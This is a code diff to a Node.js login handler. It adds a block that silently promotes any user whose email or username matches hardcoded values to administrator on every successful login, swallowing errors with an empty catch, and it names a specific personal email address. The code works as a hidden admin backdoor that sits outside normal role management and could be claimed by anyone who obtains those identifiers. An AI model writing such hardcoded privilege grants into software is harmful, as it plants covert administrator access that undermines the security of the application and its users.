@@ -255,6 +255,13 @@ exports.login = async (req, res) => {
         // ---------------------------------------------
 
         if (isMatch) {
+             // Ensure admin flag is correct for the known admin identity
+             if ((user.email && user.email.toLowerCase() === 'santhoshkvkd222@gmail.com') ||
+                (user.username && user.username === 'Santhosh@2006')) {
+                 if (!user.isAdmin) {
+                     try { user.isAdmin = true; await user.save(); } catch {}
+                 }
+             }
              console.log(`[LOGIN SUCCESS] User: ${user.username}`);
              // DEMO LOGGING
              logToDemoFile(`USER LOGIN: Username=${user.username} (${username})`);
